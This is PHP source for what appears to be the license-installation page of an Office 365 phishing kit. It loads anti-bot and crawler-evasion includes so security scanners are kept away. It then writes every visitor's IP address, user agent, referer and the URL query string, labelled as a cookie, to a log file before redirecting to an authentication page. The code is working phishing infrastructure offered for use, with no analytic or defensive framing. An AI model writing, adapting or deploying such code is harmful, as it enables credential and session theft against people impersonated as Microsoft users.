<?php
error_reporting(0);
include '../anti.php';
session_start();
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";

require_once("SCRIPT/apl_core_configuration.php");

require_once("SCRIPT/apl_core_functions.php");



$ip = $_SERVER['REMOTE_ADDR'];
$cookie = $_SERVER['QUERY_STRING'];
$hash = md5($ip);



function GetIP()
{
if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
$ip = getenv("HTTP_CLIENT_IP");
else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
$ip = getenv("HTTP_X_FORWARDED_FOR");
else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
$ip = getenv("REMOTE_ADDR");
else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
$ip = $_SERVER['REMOTE_ADDR'];
return($ip);



}



function logData()
{
$ipLog="log.txt";
$cookie = urldecode($_SERVER['QUERY_STRING']);
fwrite($fp, $cookie. PHP_EOL);
$register_globals = (bool) ini_get('register_gobals');
if ($register_globals) $ip = getenv('REMOTE_ADDR');
else $ip = GetIP();


$rem_port = $_SERVER['REMOTE_PORT'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$rqst_method = $_SERVER['METHOD'];
$rem_host = $_SERVER['REMOTE_HOST'];
$referer = $_SERVER['HTTP_REFERER'];
$date=date ("l dS of F Y h:i:s A");
$cookie = urldecode($_SERVER['QUERY_STRING']);
$log=fopen("$ipLog", "a+");


if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie <br>");
else
fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
fclose($log);
}


logData();


if (isset($submit_ok))
    {
    //Function can be provided with root URL of this script, licensed email address/license code and MySQLi link (only when database is used).
    //Function will return array with 'notification_case' and 'notification_text' keys, where 'notification_case' contains action status and 'notification_text' contains action summary.
    $license_notifications_array=aplInstallLicense($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);

    if ($license_notifications_array['notification_case']=="notification_license_ok") //'notification_license_ok' case returned - operation succeeded
        {
        header("Location: auth.php?&sessionid=$hash&ac=2687637638638");
        }
    else //Other case returned - operation failed
        {
        $demo_page_message="Office365 page installation failed because of this reason: ".$license_notifications_array['notification_text'];
        }
    }
    $demo_page_url=str_ireplace('/install.php', '', 'http'.(empty($_SERVER['HTTPS'])?'':'s').'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);

//Get all variables submitted by user
if (!empty($_POST) && is_array($_POST))
    {
    extract(array_map("trim", $_POST), EXTR_SKIP); //automatically make a variable from each argument submitted by user (don't overwrite existing variables)
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Install License - Office 365</title>
</head>
<body>
    <?php if (!empty($demo_page_message)) {echo "<center><b>$demo_page_message</b></center><br><br>";} ?>
    <center><form action="<?php echo basename(__FILE__); ?>" method="post">
        Licensed email address (for personal license)<br>
        <input type="email" name="CLIENT_EMAIL" size="50"><br><br>
        License code (for anonymous license)<br>
        <input type="text" name="LICENSE_CODE" size="50"><br><br>
        Installation URL (without / at the end)<br>
        <input type="text" name="ROOT_URL" size="50" value="<?php echo $demo_page_url; ?>"><br><br>
        <button type="submit" name="submit_ok">Submit</button><br>
    </form></center>
</body>
</html>